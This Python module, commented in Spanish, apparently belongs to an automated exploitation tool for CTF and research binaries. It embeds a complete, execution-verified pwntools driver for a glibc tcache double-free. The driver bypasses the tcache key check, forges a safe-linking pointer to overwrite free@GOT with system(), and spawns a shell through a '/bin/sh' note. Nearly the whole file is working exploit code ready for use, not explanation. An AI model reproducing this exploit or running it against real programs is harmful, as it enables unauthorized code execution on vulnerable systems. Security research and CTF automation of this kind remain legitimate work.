"""Tcache dup (glibc >= 2.34, sin __free_hook/__malloc_hook) -> free@GOT = system() -> shell,
verificado por ejecucion.

Para un UAF menu-driven (new/free/edit/show) donde free() no anula el puntero Y no hay
comprobacion de "ya liberado" antes de un segundo free(), la unica defensa real en glibc
moderno es el campo `key` aleatorizado de tcache (deteccion de double-free) -- pero como
tenemos una escritura UAF (edit sobre un indice ya liberado), basta con corromper ese campo con
CUALQUIER valor distinto para saltarnosla: no hace falta adivinarlo ni filtrarlo.

Con eso, un doble-free clasico ("tcache dup") deja el bin en un ciclo autoreferente de 1 chunk;
editando el campo `next` de ese chunk (cifrado con safe-linking, XOR contra `direccion_del_campo
>> 12` -- calculable sin ninguna fuga porque el sandbox corre con ASLR desactivado) se puede
redirigir la SIGUIENTE reserva a una direccion arbitraria. La unica comprobacion real que glibc
2.3x-2.4x sigue haciendo sobre esa direccion es que este alineada a 16 bytes (si no,
"malloc(): unaligned tcache chunk detected" aborta el proceso) -- no hay comprobacion de que el
contenido en `direccion-8` parezca un tamano de chunk valido.

Como glibc >= 2.34 ya no tiene __free_hook/__malloc_hook (los binarios de este estilo tipicamente
no llaman a system() en ningun sitio), el objetivo es la propia entrada GOT de `free`: si esta
alineada a 16 bytes (comun, ya que las GOT suelen ir en orden de 8 en 8 y la mitad caen
alineadas), reservar ahi y escribir la direccion de `system` (resuelta desde la libc local del
proceso, sin fuga real necesaria: esto es un sandbox controlado) la retarget-ea. La propia
operacion "free" del binario, invocada sobre una nota cuyo CONTENIDO es "/bin/sh", se convierte
entonces en system("/bin/sh") = shell.

Runs en el sandbox binoracle-pwn. Solo para binarios AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import re
import subprocess
import sys
import time
from pwn import *
context.binary = elf = ELF(sys.argv[1], checksec=False); context.log_level = "error"

KEYWORDS = {
    "new": ("new", "alloc", "add", "create"),
    "free": ("free", "del", "remove"),
    "write": ("edit", "note", "write", "set", "update", "modify"),
}
PROMPT = None
opts = None
for raw in re.findall(rb"[ -~]{6,}", elf.data):
    s = raw.decode("latin1")
    toks = re.findall(r"(\d+)\s*\)\s*([A-Za-z_]+)", s)
    if len(toks) < 3:
        continue
    cand = {}
    for num, word in toks:
        wl = word.lower()
        for cat, kws in KEYWORDS.items():
            if cat not in cand and any(kw in wl for kw in kws):
                cand[cat] = int(num)
    if all(c in cand for c in ("new", "free", "write")):
        PROMPT, opts = raw, cand
        break
if not opts:
    print("NOT_APPLICABLE (no se reconocio un menu new/free/edit)"); sys.exit(1)

# candidatos de GOT alineados a 16 bytes (comprobacion real de glibc en tcache_get): probar
# 'free' primero (la propia operacion del binario la dispara sin pasos extra).
got_candidates = []
for name in ("free", "malloc", "puts", "printf", "read", "write"):
    addr = (elf.got or {}).get(name)
    if addr is not None and addr % 16 == 0:
        got_candidates.append((name, addr))
if not got_candidates:
    print("NOT_APPLICABLE (ninguna entrada GOT alineada a 16 bytes)"); sys.exit(1)

def find_heap(pid, elf_base):
    cands = []
    with open(f"/proc/{pid}/maps") as f:
        for l in f:
            parts = l.split()
            if len(parts) < 5:
                continue
            rng, perms, off, dev = parts[0], parts[1], parts[2], parts[3]
            rest = parts[4:]
            if perms.startswith("rw") and dev == "00:00" and (not rest or rest[0] == "0"):
                lo, hi = [int(x, 16) for x in rng.split("-")]
                if lo > elf_base and (hi - lo) < 0x100000:
                    cands.append((lo, hi))
    cands.sort()
    return cands[0] if cands else None

def menu(io, op, idx):
    io.sendline(str(op).encode())
    io.recvuntil(b"idx", timeout=4)
    io.sendline(str(idx).encode())

def new(io, idx, size, data):
    menu(io, opts["new"], idx)
    io.recvuntil(b"size", timeout=4)
    io.sendline(str(size).encode())
    io.recvuntil(b"data", timeout=4)
    io.send(data)
    io.recvuntil(PROMPT, timeout=4)

def edit(io, idx, data):
    menu(io, opts["write"], idx)
    io.recvuntil(b"data", timeout=4)
    io.send(data)
    io.recvuntil(PROMPT, timeout=4)

def free(io, idx):
    menu(io, opts["free"], idx)
    io.recvuntil(PROMPT, timeout=4)

NEWSZ = 0x18   # cabe en el bin minimo de tcache (0x20) en x86_64
ok = False
for gotname, gotaddr in got_candidates:
    io = None
    try:
        io = process([elf.path], stderr=subprocess.STDOUT, aslr=False)
        pid = io.pid
        io.recvuntil(PROMPT, timeout=4)

        libc_base = None
        for lib, base in io.libs().items():
            if "libc.so" in lib:
                libc_base = base
        if libc_base is None:
            raise RuntimeError("no se pudo resolver la libc del proceso")
        libc_path = [lib for lib in io.libs() if "libc.so" in lib][0]
        libc = ELF(libc_path, checksec=False)
        system_addr = libc_base + libc.symbols["system"]

        MARK = b"AAAAMARK"
        new(io, 0, NEWSZ, MARK)
        h = find_heap(pid, elf.address)
        if not h:
            raise RuntimeError("no se encontro el segmento de heap")
        with open(f"/proc/{pid}/mem", "rb") as m:
            m.seek(h[0]); whole = m.read(h[1] - h[0])
        off = whole.find(MARK)
        if off < 0:
            raise RuntimeError("no se encontro el chunk recien reservado")
        c0 = h[0] + off

        new(io, 3, NEWSZ, b"/bin/sh\x00")   # nota victima: free(3) pasara este puntero

        free(io, 0)
        edit(io, 0, b"B" * NEWSZ)            # corrompe key: bypass double-free (glibc >= 2.29)
        free(io, 0)                          # dup: count=2, entries=c0 (ciclo autoreferente)

        enc = (c0 >> 12) ^ gotaddr
        edit(io, 0, enc.to_bytes(8, "little") + b"C" * (NEWSZ - 8))
        new(io, 1, NEWSZ, b"D" * NEWSZ)       # pop 1: consume c0, entries=decode(c0.next)=GOT
        new(io, 2, 8, system_addr.to_bytes(8, "little"))   # pop 2: devuelve GOT, escribe system()

        free(io, 3)                          # dispara: free(notes[3]) -> system("/bin/sh")
        io.sendline(b"echo BINORACLE_PWNED; id")
        out = io.recvrepeat(timeout=3)
        io.close()
    except Exception:
        try:
            if io:
                io.close()
        except Exception:
            pass
        continue
    if b"BINORACLE_PWNED" in out or b"uid=" in out:
        print("VERIFIED got=%s(%#x) system=%#x" % (gotname, gotaddr, system_addr))
        ok = True
        break
if not ok:
    print("NOT_VERIFIED")
    sys.exit(1)
'''


def _tcache_dup_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): necesita 'malloc' y 'free' importados, y NO 'win' (si hay
    win(), heap_shell_ok/uaf_fnptr_ok ya cubren el caso con una tecnica mas directa). El
    reconocimiento del menu y de las entradas GOT alineadas se hace dentro del sandbox."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return "malloc" in names and "free" in names and "win" not in names
    except Exception:
        return True


def autotcachedup_shell(binary: str) -> dict:
    """Explota un tcache dup (double-free + UAF write) sobrescribiendo una entrada GOT alineada
    a 16 bytes (free@GOT primero) con system(), verificado con shell real en el sandbox."""
    if not _tcache_dup_applicable(binary):
        return {"ok": False, "note": "no aplicable (falta malloc/free, o ya hay win(): usa heap_shell_ok/uaf_fnptr_ok)"}
    res = run_driver(binary, _DRIVER, ".binoracle_tcachedup.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"tcache dup -> GOT=system -> shell (verificado por ejecucion, {eng})"
                   if res.get("verified")
                   else f"no verificado ({eng}): menu no reconocido, ninguna GOT alineada, o el double-free no aplica asi")
    return res


def render_tcachedup(r: dict) -> str:
    out = ["## Tcache dup / GOT=system (confirmacion por ejecucion)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- explotado: **{'SI' if r.get('verified') else 'no'}**")
    out.append(r.get("detail") or r.get("note", ""))
    return "\n".join(out)
